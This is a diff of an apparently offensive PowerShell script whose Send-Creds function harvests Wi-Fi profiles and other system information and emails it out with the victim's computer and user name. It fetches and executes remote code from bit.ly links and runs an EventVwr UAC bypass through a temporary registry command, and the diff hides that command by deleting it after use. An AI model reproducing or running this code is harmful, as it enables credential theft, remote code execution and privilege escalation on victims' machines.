@@ -35,7 +35,7 @@ Function Send-Creds {
 			Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2etS486')
 			`$Information += Get-WLAN_Profiles -LANGUAGE es-ES | Format-Table | Out-String
 		} catch {}
-		`$Information
+		
 		# Send Email
 		`$Subject = 'Information_Gathered - ' + `$env:COMPUTERNAME + '\' + `$env:USERNAME
 		Send-Email -From '$from' -Password '$Password' -To '$To' -Subject `$Subject -Body `$Information
@@ -54,10 +54,12 @@ Function Send-Creds {
 		# Import EventVwrBypass module
 		Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2bKS5oM')
 		# Save command in the register
-		New-ItemProperty -Path 'HKCU:\Software\Microsoft\Powershell' -Name 'Command' -Value $Command -PropertyType string -Force | Out-Null
+		$Path = 'HKCU:\Software\Microsoft\Powershell'
+		Remove-ItemProperty -Path $Path -Name 'Command' -Force -ErrorAction SilentlyContinue
+		New-ItemProperty -Path $Path -Name 'Command' -Value $Command -PropertyType string -Force | Out-Null
 		# Execute bypass w/encoded command
 		Invoke-EventVwrBypass -Command 'Powershell -NoExit -WindowStyle Maximized Invoke-Expression (Get-ItemProperty -Path HKCU:\Software\Microsoft\Powershell).Command' -Force
 		# Remove command from the register
-		#Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Powershell' -Name 'Command' -Force
+		Remove-ItemProperty -Path $Path -Name 'Command' -Force
 	}
 }
